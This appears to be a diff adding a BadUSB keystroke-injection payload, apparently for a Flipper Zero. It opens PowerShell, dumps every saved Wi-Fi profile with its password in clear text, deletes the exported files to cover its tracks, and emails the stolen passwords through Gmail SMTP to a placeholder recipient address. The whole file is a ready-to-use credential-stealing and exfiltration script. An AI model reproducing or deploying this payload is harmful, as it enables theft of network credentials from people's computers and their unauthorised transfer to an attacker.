@@ -1,0 +1,17 @@
+DELAY 500
+GUI r
+DELAY 500
+STRING powershell
+ENTER
+DELAY 2500
+STRING cmd /c "netsh wlan export profile key=clear"
+ENTER
+DELAY 500
+STRING Select-String -Path Wi*.xml -Pattern 'keyMaterial' > Wi-fi.txt; $WiFi = [IO.File]::ReadAllText(".\Wi-fi.txt"); rm Wi-*
+ENTER
+DELAY 500
+STRING $SMTPInfo = New-Object Net.Mail.SmtpClient('smtp.gmail.com', 587); $SMTPInfo.EnableSsl = $true; $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('%GMAIL_ACC%', '%TOKEN%'); $ReportEmail = New-Object System.Net.Mail.MailMessage; $ReportEmail.From = '%GMAIL_ACC%'; $ReportEmail.To.Add('%SEND_TO%'); $ReportEmail.Body = "Flipper Report: $Wifi"; $SMTPInfo.Send($ReportEmail)
+ENTER
+DELAY 500
+STRING exit
+ENTER
